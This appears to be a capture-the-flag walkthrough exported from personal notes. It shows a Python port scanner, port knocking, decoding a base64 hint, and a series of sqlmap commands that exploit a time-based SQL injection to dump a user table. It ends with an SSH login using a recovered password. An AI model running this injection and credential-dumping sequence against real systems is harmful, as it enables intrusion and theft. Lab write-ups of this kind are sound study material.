<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>procedure</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>procedure</h1><br/><p>we made a simple port knocking script so that we can test our theory that will help us find if there are ports open if we knock them:</p><p></p><p><div class="codebox"><pre><span style="color:#bf2e5e;font-weight:400">import</span> socket<br /><br /><span style="color:#49aee6;font-weight:400"># function for trying the port is open or not</span><br /><span style="color:#bf2e5e;font-weight:400">def</span> <span style="color:#4a88f1;font-weight:400">try_port</span>(port):<br />    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br />    s.settimeout(<span style="color:#9755b3;font-weight:400">0.1</span>)<br />    <span style="color:#bf2e5e;font-weight:400">try</span>:<br />        s.connect((<span style="color:#5ebdab;font-weight:400">&#39;ip&#39;</span>,port))<br />    <span style="color:#bf2e5e;font-weight:400">except</span> socket.error:<br />        <span style="color:#49aee6;font-weight:400">#print(&quot;Port is closed&quot;)</span><br />        <span style="color:#bf2e5e;font-weight:400">return</span> <span style="color:#9755b3;font-weight:400">False</span><br />    <span style="color:#bf2e5e;font-weight:400">try</span>:<br />        data = s.recv(<span style="color:#9755b3;font-weight:400">4096</span>)<br /><br />        <span style="color:#49aee6;font-weight:400">#print(&quot;port is open! received the data&quot;)</span><br />        s.close()<br />        <span style="color:#bf2e5e;font-weight:400">return</span> <span style="color:#9755b3;font-weight:400">True</span><br />    <span style="color:#bf2e5e;font-weight:400">except</span> socket.timeout:<br />        <span style="color:#49aee6;font-weight:400">#print(&quot;Port is open but timed out&quot;)</span><br />        s.close()<br />        <span style="color:#49aee6;font-weight:400">#data = &quot;&quot;</span><br />        <span style="color:#bf2e5e;font-weight:400">return</span> <span style="color:#9755b3;font-weight:400">True</span><br />    <span style="color:#49aee6;font-weight:400">#return data</span><br /><br /><span style="color:#49aee6;font-weight:400"># function that&#39;ll scan every port from 1 to 65535 , range is exclusive for the last so that&#39;s why 65536</span><br /><span style="color:#bf2e5e;font-weight:400">def</span> <span style="color:#4a88f1;font-weight:400">scan</span>():<br />    found_ports =[]<br />    <span style="color:#bf2e5e;font-weight:400">for</span> port <span style="color:#bf2e5e;font-weight:400">in</span> <span style="color:#49aee6;font-weight:400">range</span>(<span style="color:#9755b3;font-weight:400">1</span>,<span style="color:#9755b3;font-weight:400">65536</span>):<br />        connected = try_port(port)<br />        <span style="color:#bf2e5e;font-weight:400">if</span> connected:<br />            found_ports.append(port)<br />    <span style="color:#bf2e5e;font-weight:400">return</span> found_ports<br /></pre></div></p><p></p><p>and we converted it to base64 to decode it later and copied it to our clipboard , {classical ctf trick}:</p><p>  base64 port_scanner.py</p><p>  base64 port_scanner.py | tr -d &quot;\n&quot;</p><p>  base64 port_scanner.py | tr -d &quot;\n&quot; | xclip -selection clipboard</p><p>  </p><p>  giving us: </p><p> </p><p> we can decrypt it via:</p><p> </p><p> echo “aW1wb3J0IHNvY2tldAoKIyBmdW5jdGlvbiBmb3IgdHJ5aW5nIHRoZSBwb3J0IGlzIG9wZW4gb3Igbm90CmRlZiB0cnlfcG9ydChwb3J0KToKICAgIHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSkKICAgIHMuc2V0dGltZW91dCgwLjEpCiAgICB0cnk6CiAgICAgICAgcy5jb25uZWN0KCgnaXAnLHBvcnQpKQogICAgZXhjZXB0IHNvY2tldC5lcnJvcjoKICAgICAgICAjcHJpbnQoIlBvcnQgaXMgY2xvc2VkIikKICAgICAgICByZXR1cm4gRmFsc2UKICAgIHRyeToKICAgICAgICBkYXRhID0gcy5yZWN2KDQwOTYpCgogICAgICAgICNwcmludCgicG9ydCBpcyBvcGVuISByZWNlaXZlZCB0aGUgZGF0YSIpCiAgICAgICAgcy5jbG9zZSgpCiAgICAgICAgcmV0dXJuIFRydWUKICAgIGV4Y2VwdCBzb2NrZXQudGltZW91dDoKICAgICAgICAjcHJpbnQoIlBvcnQgaXMgb3BlbiBidXQgdGltZWQgb3V0IikKICAgICAgICBzLmNsb3NlKCkKICAgICAgICAjZGF0YSA9ICIiCiAgICAgICAgcmV0dXJuIFRydWUKICAgICNyZXR1cm4gZGF0YQoKIyBmdW5jdGlvbiB0aGF0J2xsIHNjYW4gZXZlcnkgcG9ydCBmcm9tIDEgdG8gNjU1MzUgLCByYW5nZSBpcyBleGNsdXNpdmUgZm9yIHRoZSBsYXN0IHNvIHRoYXQncyB3aHkgNjU1MzYKZGVmIHNjYW4oKToKICAgIGZvdW5kX3BvcnRzID1bXQogICAgZm9yIHBvcnQgaW4gcmFuZ2UoMSw2NTUzNik6CiAgICAgICAgY29ubmVjdGVkID0gdHJ5X3BvcnQocG9ydCkKICAgICAgICBpZiBjb25uZWN0ZWQ6CiAgICAgICAgICAgIGZvdW5kX3BvcnRzLmFwcGVuZChwb3J0KQogICAgcmV0dXJuIGZvdW5kX3BvcnRzCg==” | bash64 -d &gt; scan.py</p><p> </p><p> </p><p> didn&#39;t work but but we found a tool that woulf help us do this thing:</p><p> <img src="images/21-1.png" alt="images/21-1.png" /> what we did was knocked these ports and this new port was now open , just like the code knocks to get entry in some exclusive bars</p><p> </p><p> though we cannot visit the site , think it&#39;s like binded via name or something but dns error doesn&#39;t shows up, we can still curl:</p><p> </p><p> <img src="images/21-2.png" alt="images/21-2.png" /></p><p> this is what it looks like to do curl with the same file:</p><p> <img src="images/21-3.png" alt="images/21-3.png" /> I think it&#39;s shell password</p><p> THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh</p><p> </p><p> looks like base64:</p><p> <img src="images/21-4.png" alt="images/21-4.png" /></p><p> doubly encoded:</p><p> <img src="images/21-5.png" alt="images/21-5.png" /></p><p> </p><p> we get this when we visit the site:</p><p> <img src="images/21-6.png" alt="images/21-6.png" /></p><p> </p><p> </p><p> when we look it in person:</p><p> <img src="images/21-7.png" alt="images/21-7.png" /></p><p> </p><p> </p><p> feeling is coming for sql injection , check the intution via sqlmap:</p><p> </p><p>  </p><p>  <h3>sqlmap --url http://192.168.82.101:1337/978345210/index.php --forms --dbs --level=5 --risk=3 --batch</h3></p><p>  <div class="codebox"><pre><br />The command sqlmap <span style="color:#bf2e5e;font-weight:400">is</span> a popular <span style="color:#49aee6;font-weight:400">open</span>-source penetration testing tool that automates the process of detecting <span style="color:#bf2e5e;font-weight:400">and</span> exploiting SQL injection vulnerabilities <span style="color:#bf2e5e;font-weight:400">in</span> web applications. It <span style="color:#bf2e5e;font-weight:400">is</span> primarily used to test the security of web applications <span style="color:#bf2e5e;font-weight:400">and</span> identify potential vulnerabilities related to SQL injection.<br /><br />Here<span style="color:#5ebdab;font-weight:400">&#39;s a breakdown of the command and its options:</span><br /><br />--url http://10.0.0.28:<span style="color:#9755b3;font-weight:400">1337</span>/<span style="color:#9755b3;font-weight:400">978345210</span>/index.php: Specifies the URL of the target web application to be tested.<br />--forms: Instructs sqlmap to identify <span style="color:#bf2e5e;font-weight:400">and</span> exploit SQL injection vulnerabilities within web forms.<br />--dbs: Requests sqlmap to <span style="color:#49aee6;font-weight:400">enumerate</span> the available databases on the target server.<br />--level=<span style="color:#9755b3;font-weight:400">5</span>: Sets the level of tests to perform. Higher values indicate more thorough <span style="color:#bf2e5e;font-weight:400">and</span> intensive testing.<br />--risk=<span style="color:#9755b3;font-weight:400">3</span>: Sets the risk level <span style="color:#bf2e5e;font-weight:400">for</span> tests. Higher values increase the likelihood of finding vulnerabilities, but may also cause more false positives.<br />--batch: Runs sqlmap <span style="color:#bf2e5e;font-weight:400">in</span> batch mode, which means it will <span style="color:#bf2e5e;font-weight:400">not</span> prompt <span style="color:#bf2e5e;font-weight:400">for</span> user <span style="color:#49aee6;font-weight:400">input</span> <span style="color:#bf2e5e;font-weight:400">and</span> instead rely on automatic detection <span style="color:#bf2e5e;font-weight:400">and</span> exploitation.<br />Overall, this command instructs sqlmap to target the specified URL, identify SQL injection vulnerabilities within web forms, <span style="color:#49aee6;font-weight:400">enumerate</span> databases, perform thorough testing <span style="color:#bf2e5e;font-weight:400">with</span> high risk level, <span style="color:#bf2e5e;font-weight:400">and</span> run <span style="color:#bf2e5e;font-weight:400">in</span> batch mode without requiring user interaction.<br /><br /></pre></div></p><p>  </p><p>  we can also try:</p><p>  </p><p>  sqlmap --har=sqlmap.log --data=&quot;username=test&amp;password=test&amp;submit=+Login+&quot; --url=&quot;http://192.168.82.101:1337/978345210/index.php&quot; --banner --level=5 --risk=3 -v3 --dbms=mysql</p><p>  </p><p><div class="codebox"><pre>The command sqlmap <span style="color:#bf2e5e;font-weight:400">in</span> this example <span style="color:#bf2e5e;font-weight:400">is</span> used <span style="color:#bf2e5e;font-weight:400">with</span> various options to perform a targeted SQL injection attack on a web application. Let<span style="color:#5ebdab;font-weight:400">&#39;s break down the options used:</span><br /><br />--har=sqlmap.log: Specifies the <span style="color:#49aee6;font-weight:400">input</span> <span style="color:#49aee6;font-weight:400">file</span> containing the captured HTTP request <span style="color:#bf2e5e;font-weight:400">in</span> HAR (HTTP Archive) <span style="color:#49aee6;font-weight:400">format</span>. The HAR <span style="color:#49aee6;font-weight:400">file</span> <span style="color:#bf2e5e;font-weight:400">is</span> usually generated by intercepting web traffic using tools like Burp Suite <span style="color:#bf2e5e;font-weight:400">or</span> Chrome Developer Tools. The <span style="color:#49aee6;font-weight:400">file</span> sqlmap.log contains the captured request information that will be used by sqlmap <span style="color:#bf2e5e;font-weight:400">for</span> the attack.<br />--data=<span style="color:#5ebdab;font-weight:400">&quot;username=test&amp;password=test&amp;submit=+Login+&quot;</span>: Provides the POST data to be used <span style="color:#bf2e5e;font-weight:400">in</span> the SQL injection attack. It simulates a form submission <span style="color:#bf2e5e;font-weight:400">with</span> the specified data.<br />--url=<span style="color:#5ebdab;font-weight:400">&quot;http://10.183.0.214:1337/978345210/index.php&quot;</span>: Specifies the target URL of the web application to be attacked.<br />--banner: Displays the DBMS (Database Management System) banner retrieved during the scan.<br />--level=<span style="color:#9755b3;font-weight:400">5</span>: Sets the level of tests to perform. Higher values indicate more thorough <span style="color:#bf2e5e;font-weight:400">and</span> intensive testing.<br />--risk=<span style="color:#9755b3;font-weight:400">3</span>: Sets the risk level <span style="color:#bf2e5e;font-weight:400">for</span> tests. Higher values increase the likelihood of finding vulnerabilities but may also cause more false positives.<br />-v3: Sets the verbosity level of the output. Level <span style="color:#9755b3;font-weight:400">3</span> provides detailed output during the scanning process.<br />--dbms=mysql: Specifies the database management system (DBMS) to be targeted. In this case, the target DBMS <span style="color:#bf2e5e;font-weight:400">is</span> MySQL.<br />Overall, this command instructs sqlmap to use the captured request information <span style="color:#bf2e5e;font-weight:400">from</span> <span style="color:#4a88f1;font-weight:400">the</span> HAR <span style="color:#49aee6;font-weight:400">file</span>, target the specified URL, perform a SQL injection attack using the provided POST data, display the DBMS banner, perform thorough testing <span style="color:#bf2e5e;font-weight:400">with</span> a high risk level, provide detailed output during the scan, <span style="color:#bf2e5e;font-weight:400">and</span> focus on exploiting vulnerabilities specific to MySQL.</pre></div></p><p></p><p></p><p>we get it&#39;s a time based SQLi :</p><p><img src="images/21-8.png" alt="images/21-8.png" /></p><p></p><p>we&#39;ll have to use the sqlmap to retrive out the database info too:</p><p></p><p>sqlmap --har=sqlmap.log --data=&quot;username=test&amp;password=test&amp;submit=+Login+&quot; --url=&quot;<a href="http://192.168.82.101:1337/978345210/index.php">http://192.168.82.101:1337/978345210/index.php</a>&quot; -v3 --dbms=mysql --time-sec=1 --dbs</p><p></p><p>we get:</p><p></p><p> <img src="images/21-9.png" alt="images/21-9.png" /></p><p> </p><p> let&#39;s try the Webapp table and dump it&#39;s creds:</p><p> sqlmap --data=&quot;username=test&amp;password=test&amp;submit=+Login+&quot; --url=&quot;<a href="http://192.168.82.101:1337/978345210/index.php">http://192.168.82.101:1337/978345210/index.php</a>&quot; -v3 --dbms=mysql --time-sec=1 -D Webapp --tables</p><p> </p><p><img src="images/21-10.png" alt="images/21-10.png" /></p><p> </p><p> now it&#39;s time to check the rows and columns:</p><p> sqlmap --data=&quot;username=test&amp;password=test&amp;submit=+Login+&quot; --url=&quot;<a href="http://192.168.82.101:1337/978345210/index.php">http://192.168.82.101:1337/978345210/index.php</a>&quot; -v3 --dbms=mysql --time-sec=1 -D Webapp -T Users --columns</p><p>we get:</p><p><img src="images/21-11.png" alt="images/21-11.png" /></p><p></p><p>then we dump them:</p><p> sqlmap --har=sqlmap.log --data=&quot;username=test&amp;password=test&amp;submit=+Login+&quot; --url=&quot;<a href="http://192.168.82.101:1337/978345210/index.php">http://192.168.82.101:1337/978345210/index.php</a>&quot; -v3 --dbms=mysql --time-sec=1 -D Webapp -T Users -C id,username,password --dump</p><p></p><p>we get:</p><p><img src="images/21-12.png" alt="images/21-12.png" /></p><p></p><p>we already enumerated the username smeagol from the login screen , trying ssh:</p><p>MyPreciousR00t</p><p></p><p>yes it&#39;s right and we also found something in the root directory:</p><p><img src="images/21-13.png" alt="images/21-13.png" /></p><p></p></div>
</body>
</html>
